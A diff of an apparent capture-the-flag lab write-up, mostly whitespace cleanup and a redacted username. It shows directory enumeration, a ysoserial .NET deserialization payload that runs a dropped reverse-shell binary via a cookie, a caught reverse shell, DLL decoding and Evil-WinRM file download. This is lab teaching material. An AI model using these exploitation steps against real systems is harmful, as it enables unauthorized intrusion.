@@ -118,9 +118,9 @@ We have the credentials, let's search for any endpoints we can use this in.
 
 ```bash
 kali@kali:dirb https://web.teignton.htb/
-                                                                                                                                           
------------------                                                                                                                          
-DIRB v2.22    
+
+-----------------
+DIRB v2.22
 By The Dark Raver
 -----------------
 
@@ -130,25 +130,25 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
-GENERATED WORDS: 4612                                                          
+GENERATED WORDS: 4612
 
 ---- Scanning URL: https://web.teignton.htb/ ----
-+ https://web.teignton.htb/admin (CODE:200|SIZE:2879)                                                                                     
-+ https://web.teignton.htb/Admin (CODE:200|SIZE:2879)                                                                                     
-+ https://web.teignton.htb/ADMIN (CODE:200|SIZE:2879)                                                                                     
-+ https://web.teignton.htb/api (CODE:401|SIZE:0)                                                                                          
-+ https://web.teignton.htb/autodiscover (CODE:401|SIZE:0)                                                                                 
-+ https://web.teignton.htb/ews (CODE:401|SIZE:0)                                                                                          
-+ https://web.teignton.htb/favicon.ico (CODE:200|SIZE:32038)                                                                              
-+ https://web.teignton.htb/home (CODE:200|SIZE:2548)                                                                                      
-+ https://web.teignton.htb/Home (CODE:200|SIZE:2548)                                                                                      
-+ https://web.teignton.htb/owa (CODE:302|SIZE:215)                                                                                        
-+ https://web.teignton.htb/rpc (CODE:401|SIZE:0)                                                                                          
++ https://web.teignton.htb/admin (CODE:200|SIZE:2879)
++ https://web.teignton.htb/Admin (CODE:200|SIZE:2879)
++ https://web.teignton.htb/ADMIN (CODE:200|SIZE:2879)
++ https://web.teignton.htb/api (CODE:401|SIZE:0)
++ https://web.teignton.htb/autodiscover (CODE:401|SIZE:0)
++ https://web.teignton.htb/ews (CODE:401|SIZE:0)
++ https://web.teignton.htb/favicon.ico (CODE:200|SIZE:32038)
++ https://web.teignton.htb/home (CODE:200|SIZE:2548)
++ https://web.teignton.htb/Home (CODE:200|SIZE:2548)
++ https://web.teignton.htb/owa (CODE:302|SIZE:215)
++ https://web.teignton.htb/rpc (CODE:401|SIZE:0)
                                                                                                                                           
 -----------------
 END_TIME: Wed Feb 25 12:10:56 2026
 DOWNLOADED: 4612 - FOUND: 11
-```
+``
 
 The /owa endpoint seems interesting.
 
@@ -230,7 +230,7 @@ Now, generate a base64 encoded payload to run the reverse shell payload we uploa
 
 
 ```powershell
-PS C:\Users\ritik\Downloads\Pentest\Release_Archive\Release> .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\ProgramData\s83ll.exe"
+PS C:\Users\r----k\Downloads\Pentest\Release_Archive\Release> .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\ProgramData\s83ll.exe"
 ew0KICAgI.....B9DQp9
 ```
 
@@ -241,13 +241,13 @@ Similarly, add the new base64 encoded payload in the Profile cookie and refresh 
 Should receive the reverse shell connection.
 
 ```bash
-kali@kali:penelope -p 9001
-[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.78 • 172.17.0.1 • 172.18.0.1 • 10.10.16.15
-➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+kali@kali:penelope -p 9001[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.78 • 172.17.0.1 • 172.18.0.1 • 10.10.16.15
+➤  🏠 Main Menu (m) 💀Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from WEB~10.13.37.12-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍 Assigned SessionID <1>
 [+] Added readline support...
-[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
-[+] Logging to /home/kali/.penelope/sessions/WEB~10.13.37.12-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_02_25-12_46_11-796.log 📜                                                                                                                                       
+[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D
+[+] Logging to /home/kali/.penelope/sessions/WEB~10.13.37.12-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_02_25-12_46_11-796.log 📜
+
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 PS C:\Windows\system32> whoami
 teignton\web_user
@@ -442,14 +442,14 @@ Let's put the decoded value of this base64 encoded blob into a dll file for anal
 echo "TVqQAAMAAAAEAAAA//8AAL.....AAAAAAAAAAA" | base64 -d > decoded.dll
 ```
 ```bash
-kali@kali:file decoded.dll                                                                                                                                       
+kali@kali:file decoded.dll
 decoded.dll: PE32 executable for MS Windows 4.00 (DLL), Intel i386 Mono/.Net assembly, 3 sections
 ```
 
 Now, we have a DLL file, we can analyze using any tools of choice. I will use monodis for this.
 
 ```bash
-kali@kali:monodis decoded.dll                                                                                                                           
+kali@kali:monodis decoded.dll
 .assembly extern mscorlib
 {
   .ver 4:0:0:0
@@ -501,15 +501,15 @@ teignton\jay.teignton
 There is WindowsService.exe on Documents folder, let's download that to analyze it.
 
 ```bash
-*Evil-WinRM* PS C:\Users\jay.teignton\Documents> download WindowsService.exe                                        
-Info: Downloading C:\Users\jay.teignton\Documents\WindowsService.exe to WindowsService.exe                                        
+*Evil-WinRM* PS C:\Users\jay.teignton\Documents> download WindowsService.exe
+Info: Downloading C:\Users\jay.teignton\Documents\WindowsService.exe to WindowsService.exe
 Info: Download successful!
 ```
 
 Let's decompile it using monodis.
 
 ```bash
-kali@kali:monodis WindowsService.exe                                                                                                             
+kali@kali:monodis WindowsService.exe
 .assembly extern mscorlib
 {
   .ver 4:0:0:0
